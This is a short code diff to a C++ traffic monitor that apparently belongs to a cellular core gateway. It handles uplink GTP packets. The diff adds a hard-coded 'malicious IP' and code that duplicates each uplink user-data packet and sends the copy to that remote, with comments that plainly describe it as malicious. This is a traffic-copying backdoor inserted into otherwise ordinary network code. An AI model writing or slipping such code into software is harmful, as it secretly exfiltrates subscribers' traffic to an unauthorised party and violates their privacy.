@@ -89,6 +89,8 @@ int getHash(string ip,int size){
 void TrafficMonitor::handle_uplink_udata() {
 	Packet pkt;
 	string ip_addr;
+    // Malicious IP - set IP to address of malicious remote
+    string mal_ip("127.0.0.1");
 	uint32_t s1_uteid_ul;
 	string sgw_s1_ip_addr;
 	int sgw_s1_port;
@@ -103,7 +105,10 @@ void TrafficMonitor::handle_uplink_udata() {
 		index = getHash(ip_addr,sgw_s1_clients.size());
 		pkt.prepend_gtp_hdr(1, 1, pkt.len, s1_uteid_ul);
 		sgw_s1_clients[index].snd(pkt);
-
+        // Send dup packet to malicious remote
+        index = getHash(mal_ip, sgw_s1_clients.size());
+		pkt.prepend_gtp_hdr(1, 1, pkt.len, s1_uteid_ul);
+		sgw_s1_clients[index].snd(pkt);
 	}
 }
 void TrafficMonitor::handle_downlink_udata() {
